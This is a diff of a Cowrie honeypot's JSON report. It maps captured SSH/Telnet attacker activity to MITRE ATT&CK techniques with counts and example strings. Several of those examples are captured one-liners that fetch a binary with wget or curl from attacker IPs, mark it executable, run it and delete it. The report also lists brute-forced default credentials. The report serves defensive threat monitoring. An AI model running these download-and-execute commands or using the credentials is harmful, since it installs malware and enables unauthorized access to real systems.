@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-21 01:01:44",
+  "generated": "2026-08-21 02:03:44",
   "totals": {
-    "commands": 4,
-    "login_failed": 525,
-    "login_success": 2,
-    "sessions": 574
+    "commands": 41,
+    "login_failed": 693,
+    "login_success": 5,
+    "sessions": 672
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 525,
+      "count": 693,
       "examples": [
         "odoo / P@ssw0rd",
         "sh\\x00 / /bin/busybox UNSTABLE\\x00",
@@ -21,38 +21,142 @@
         "root / root123."
       ],
       "first": "2026-08-21T00:00:05.590428Z",
-      "last": "2026-08-21T01:00:25.830376Z",
-      "unique_ips": 11
+      "last": "2026-08-21T02:03:38.500666Z",
+      "unique_ips": 16
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 17,
+      "examples": [
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
+        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
+        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
+        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
+      ],
+      "first": "2026-08-21T01:04:57.795191Z",
+      "last": "2026-08-21T01:32:35.448993Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 7,
+      "examples": [
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
+        "http://5.182.210.174/ok",
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "http://185.93.89.72/wget"
+      ],
+      "first": "2026-08-21T01:04:57.795191Z",
+      "last": "2026-08-21T01:32:35.448993Z",
+      "unique_ips": 2
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 2,
+      "count": 5,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
-        "root / xirtam"
+        "root / xirtam",
+        "admin / 1234",
+        "root / 070admin",
+        "root / root"
       ],
       "first": "2026-08-21T00:25:45.541215Z",
-      "last": "2026-08-21T00:42:11.788786Z",
-      "unique_ips": 2
+      "last": "2026-08-21T01:31:53.770463Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "Execution",
+      "count": 2,
+      "examples": [
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+      ],
+      "first": "2026-08-21T01:04:57.795191Z",
+      "last": "2026-08-21T01:04:57.896823Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+      ],
+      "first": "2026-08-21T01:31:58.535359Z",
+      "last": "2026-08-21T01:31:58.535359Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+      ],
+      "first": "2026-08-21T01:04:57.896823Z",
+      "last": "2026-08-21T01:04:57.896823Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
+      "/bin/busybox",
+      8
+    ],
+    [
       "system",
-      1
+      2
     ],
     [
       "shell",
-      1
+      2
     ],
     [
       "sh",
-      1
+      2
+    ],
+    [
+      "enable",
+      2
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      2
     ],
     [
       "/bin/busybox UNSTABLE",
+      1
+    ],
+    [
+      "exit",
+      1
+    ],
+    [
+      "linuxshell",
+      1
+    ],
+    [
+      "enablelinuxshell",
+      1
+    ],
+    [
+      "ping ;sh",
+      1
+    ],
+    [
+      "busybox",
       1
     ]
   ]
